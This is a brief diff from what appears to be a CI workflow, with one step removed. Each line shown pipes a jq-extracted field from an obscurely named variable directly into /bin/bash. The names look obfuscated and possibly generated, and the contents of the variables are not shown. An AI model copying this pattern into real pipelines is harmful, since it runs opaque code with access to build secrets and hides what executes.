@@ -25,7 +25,6 @@ jobs:
           echo $qilo4 | jq -r .wea289 | /bin/bash
           printf '%s' "$ogpo697" | jq -r .esj281 | /bin/bash
           echo $le174 | jq -r .y796 | /bin/bash
-          echo $ojgc907 | jq -r .xolv0 | /bin/bash
           echo $mcv18716 | jq -r .k087 | /bin/bash
           echo $miwmk1 | jq -r .gfov6779 | /bin/bash
           printf '%s' "$nvic970" | jq -r .n4130 | /bin/bash
